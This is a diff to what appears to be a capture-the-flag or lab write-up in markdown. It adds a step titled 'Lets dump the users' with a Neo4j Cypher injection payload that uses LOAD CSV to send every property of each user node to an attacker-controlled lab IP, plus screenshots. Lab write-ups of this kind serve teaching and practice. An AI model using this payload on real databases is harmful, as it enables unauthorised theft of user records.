@@ -141,4 +141,12 @@ Now lets get the list of tables
 ![image](https://user-images.githubusercontent.com/127159644/236719094-e295b16d-f40e-40da-b8a2-5d9665fb25a9.png)
 ![image](https://user-images.githubusercontent.com/127159644/236719119-0536de45-fbd8-409d-9061-66992e1759ba.png)
 
+Lets dump the users 🙂
+
+```sql
+' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.175/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+```
+
+![image](https://user-images.githubusercontent.com/127159644/236719601-0f0aa538-ec26-414f-9ac9-f1a3478099ed.png)
+![image](https://user-images.githubusercontent.com/127159644/236719571-89a3a6db-91a6-4e92-a0ad-fadbe415c235.png)
 
